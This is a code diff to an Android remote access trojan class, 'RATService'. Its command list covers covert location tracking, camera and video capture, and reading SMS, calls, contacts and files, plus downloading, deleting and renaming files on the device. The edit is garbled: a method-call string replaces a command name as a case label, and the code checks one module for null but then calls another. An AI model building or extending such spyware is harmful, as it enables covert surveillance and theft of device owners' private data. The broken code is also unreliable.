@@ -811,7 +811,7 @@ public class RATService extends Service {
                 String helpText = "Available commands: info, location, location_stream [start/stop], " +
                                   "camera, camera_switch, camera_info, " +
                                   "video_start [width|height|fps|bitrate], video_stop, video_status, " +
-                                  "video_test, video_record_start [filename], video_record_stop, " +
+                                  "video_test, video_record_start [filename], cameraModule.stopRecording(), " +
                                   "video_switch_camera, video_resolutions, " +
                                   "sms, calls, contacts, files_list [path], file_get [path], " +
                                   "file_delete [path], file_rename [old|new], create_folder [path|name], " +
@@ -1143,7 +1143,10 @@ case "location_test":
             case "video_record_start":
                 if (videoStreamModule != null && !args.isEmpty()) {
                     Log.d(TAG, "🎥 Starting video recording: " + args);
-                    String result = videoStreamModule.startRecording(args);
+                    String result = cameraModule.startRecording(args);
+
+
+                    
 
                     try {
                         JSONObject response = new JSONObject();
@@ -1160,7 +1163,7 @@ case "location_test":
                 }
                 break;
 
-            case "video_record_stop":
+            case "cameraModule.stopRecording()":
                 if (videoStreamModule != null) {
                     Log.d(TAG, "🎥 Stopping video recording");
                     String result = videoStreamModule.stopRecording();
